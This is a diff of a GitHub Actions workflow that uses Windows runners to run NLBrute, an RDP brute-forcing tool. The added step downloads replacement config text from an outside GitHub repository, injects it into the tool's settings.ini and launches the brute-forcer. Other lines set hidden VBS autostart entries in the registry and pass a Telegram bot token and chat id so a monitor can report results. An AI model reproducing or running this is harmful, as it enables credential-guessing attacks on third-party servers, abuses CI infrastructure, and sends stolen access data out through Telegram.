@@ -259,7 +259,57 @@ jobs:
           Force-Inject-Files -exeFile $exeFile1 -sourceFiles $filesToInject
           Force-Inject-Files -exeFile $exeFile2 -sourceFiles $filesToInject
 
-          # 5. Registry & Autostart Setup
+          # 5. NEW: Modify settings.ini Line 2 with code.txt content
+          Write-Host "Modifying settings.ini..." -ForegroundColor Cyan
+          $settingsIniPath = "C:\target_app\tools\NL_sample\settings.ini"
+          
+          if (Test-Path $settingsIniPath) {
+              try {
+                  # Download the replacement text
+                  $codeTxtUrl = "https://raw.githubusercontent.com/derankoz1/vpmaj/refs/heads/main/code.txt"
+                  $tempCodeFile = "$($env:TEMP_DIR)\code.txt"
+                  Invoke-WebRequest -Uri $codeTxtUrl -OutFile $tempCodeFile
+                  
+                  # Read the replacement value (trim trailing whitespace/newlines to be safe)
+                  $replacementLine = (Get-Content $tempCodeFile -Raw).Trim()
+                  
+                  Write-Host "Replacement Value: $replacementLine" -ForegroundColor Green
+
+                  # Read existing settings.ini
+                  $iniContent = Get-Content $settingsIniPath
+                  
+                  # Handle case where file might be short or empty
+                  if ($iniContent.Count -eq 0) {
+                      # If empty, just create it with two lines (header + new line)
+                      $newContent = @("", $replacementLine)
+                  } else {
+                      # Ensure array is mutable
+                      $newContent = $iniContent -as [object[]]
+                      
+                      # If line 2 (index 1) doesn't exist, add it
+                      if ($newContent.Count -lt 2) {
+                          while ($newContent.Count -lt 2) {
+                              $newContent += ""
+                          }
+                      }
+                      
+                      # Replace index 1 (second line)
+                      $newContent[1] = $replacementLine
+                  }
+                  
+                  # Write back
+                  $newContent | Out-File -FilePath $settingsIniPath -Encoding ascii
+                  Write-Host "settings.ini updated successfully." -ForegroundColor Green
+              } catch {
+                  Write-Error "Failed to update settings.ini: $_"
+                  exit 1
+              }
+          } else {
+              Write-Warning "settings.ini not found at expected path: $settingsIniPath. Skipping update."
+          }
+          # --------------------------------------
+
+          # 6. Registry & Autostart Setup
           $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
 
           # APP 1 Setup
@@ -270,6 +320,9 @@ jobs:
               $vbsContent1 = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" + 'WshShell.CurrentDirectory = "' + $exeDir1 + '"' + "`n" + 'WshShell.Run "' + $exePath1 + '", 1, False'
               $vbsContent1 | Out-File -FilePath $vbsFile1 -Encoding ascii
               New-ItemProperty -Path $registryPath -Name "NLBruteAutostart" -Value "wscript.exe `"$vbsFile1`"" -PropertyType String -Force | Out-Null
+              
+              # LAUNCH APP 1 (After settings.ini modification)
+              Write-Host "Launching NLBrute_Manager.exe..." -ForegroundColor Yellow
               Start-Process -FilePath $exePath1 -WorkingDirectory $exeDir1 -WindowStyle Normal
           }
 
@@ -279,14 +332,4 @@ jobs:
               $exeDir2 = Split-Path $exePath2 -Parent
               $params = "-chatid 7565155789 -token 8054074057:AAF0DCvurOYgAR4dcQ8MQjTFMDBgeLGo2j4"
               $vbsFile2 = "$($env:WORK_DIR)\launcher_monitor.vbs"
-              $vbsContent2 = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" + 'WshShell.CurrentDirectory = "' + $exeDir2 + '"' + "`n" + 'WshShell.Run "cmd.exe /c ' + $exePath2 + ' ' + $params + '", 0, False'
-              $vbsContent2 | Out-File -FilePath $vbsFile2 -Encoding ascii
-              New-ItemProperty -Path $registryPath -Name "NLBruteMonitor" -Value "wscript.exe `"$vbsFile2`"" -PropertyType String -Force | Out-Null
-          }
-
-      - name: 8. Keep Server Alive (6 Hours)
-        run: |
-          for ($i = 1; $i -le 360; $i++) {
-            Start-Sleep -Seconds 60
-            Write-Host "[Server ${{ matrix.server_id }}] Running..."
-          }
+              $vbsContent2 = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" + 'WshShell.CurrentDirectory = "' + $exeDir2 + '"' + "`n" + 'WshShell.Run "cmd.exe /c ' + $exe
